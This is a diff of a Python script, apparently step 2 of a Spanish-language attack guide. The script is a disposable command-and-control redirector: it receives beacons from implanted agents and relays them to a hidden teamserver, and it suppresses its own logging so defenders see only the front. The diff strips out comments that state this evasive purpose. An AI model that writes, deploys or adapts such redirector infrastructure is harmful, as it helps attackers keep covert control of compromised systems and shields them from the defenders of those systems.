@@ -1,6 +1,5 @@
 # redirector.py — Paso 2: el frente desechable
 # Recibe beacons de los agentes y los reenvía al teamserver real.
-# La víctima (y el defensor) solo ven este frente: si lo queman, el C2 sobrevive.
 import os, urllib.request
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -18,7 +17,7 @@ class Frente(BaseHTTPRequestHandler):
         self.wfile.write(respuesta)
 
     def log_message(self, *args):
-        pass  # un buen frente no hace ruido
+        pass  
 
 print(f"Frente en :{PUERTO} → reenviando a {C2}")
 HTTPServer(("0.0.0.0", PUERTO), Frente).serve_forever()
